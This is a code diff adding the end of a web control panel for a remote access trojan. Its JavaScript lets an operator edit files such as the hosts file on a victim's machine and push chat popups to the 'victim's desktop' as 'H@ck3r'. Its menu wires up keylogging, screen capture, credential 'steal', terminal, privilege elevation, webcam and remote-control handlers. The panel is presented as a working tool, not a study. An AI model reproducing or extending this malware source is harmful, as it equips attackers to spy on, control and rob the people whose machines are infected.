+        <textarea id="npText" style="width:100%;height:380px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;font-family:'Courier New',monospace;font-size:13px;padding:8px;"></textarea>
+      </div>
+    </section>`;
+  if(!npPath) document.getElementById('npPath').value='';
+}
+function npOpenHosts(){ npPath = NP_HOSTS; document.getElementById('npPath').value = npPath; npLoad(); }
+async function npLoad() {
+  npPath = document.getElementById('npPath').value.trim();
+  const st=document.getElementById('npStatus');
+  if(!npPath){ if(st) st.textContent='Enter a path first.'; return; }
+  if(st) st.textContent='Loading...';
+  const out = await execCmd('ul', {path: npPath});
+  document.getElementById('npText').value = out ?? '';
+  if(st) st.textContent = npPath + ' ('+ (out?out.length:0) +' chars)';
+}
+async function npSave() {
+  const st=document.getElementById('npStatus');
+  const path = document.getElementById('npPath').value.trim() || npPath;
+  if(!path){ if(st) st.textContent='Enter a path first.'; return; }
+  if(st) st.textContent='Saving...';
+  const b64 = btoa(unescape(encodeURIComponent(document.getElementById('npText').value)));
+  const out = await execCmd('npsave', {path: path, b: b64});
+  if(st) st.textContent = (out==='ok') ? 'Saved: '+path : 'Error: '+(out||'no reply');
+}
+
+async function renderChat() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Chat — popup on victim screen</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;">
+          <input id="chatMsg" placeholder="Message..." style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:6px 10px;" onkeydown="if(event.key==='Enter')chatSend()">
+          <button class="btn primary" onclick="chatSend()">Send</button>
+        </div>
+        <div class="log-box" id="chatLog">['H@ck3r' = you] each message pops up on the victim's desktop</div>
+      </div>
+    </section>`;
+}
+async function chatSend() {
+  const inp=document.getElementById('chatMsg'), log=document.getElementById('chatLog');
+  if(!inp||!inp.value.trim()) return;
+  const msg=inp.value.trim(); inp.value='';
+  const out=await execCmd('chat',{msg:msg});
+  log.textContent += '\nH@ck3r: '+msg+(out&&out!=='ok'?'\n(err: '+out+')':'');
+  log.scrollTop=log.scrollHeight;
+}
+
+async function renderPlaceholder(tab) {  const main = document.getElementById('mainContent');
+  main.innerHTML = `<section class="card"><div class="card-title"><span>${tab}</span></div><div class="info"><div style="padding:20px;color:#777;">Section <b>${tab}</b> is under development</div></div></section>`;
+}
+
+document.getElementById('menu').addEventListener('click', async (e) => {
+  const item = e.target.closest('.menu-item');
+  if(!item) return;
+  document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active'));
+  item.classList.add('active');
+  const tab = item.dataset.tab;
+
+  const map = {
+    'info': renderInfo,
+    'logs': renderLogs,
+    'files': renderFiles,
+    'keylog': renderKeylog,
+    'screen': renderScreen,
+    'steal': renderSteal,
+    'terminal': renderTerminal,
+    'elevate': renderElevate,
+    'proxy': renderProxy,
+    'cam': renderCam,
+    'remote': renderRemote,
+    'tasklist': renderProcess,
+    'system': renderSystem,
+    'notepad': renderNotepad,
+    'chat': renderChat
+  };
+
+  if(map[tab]) { await map[tab](); }
+  else { await renderPlaceholder(item.textContent.trim()); }
+});
+
+renderInfo();
+</script>
+</body>
+</html>
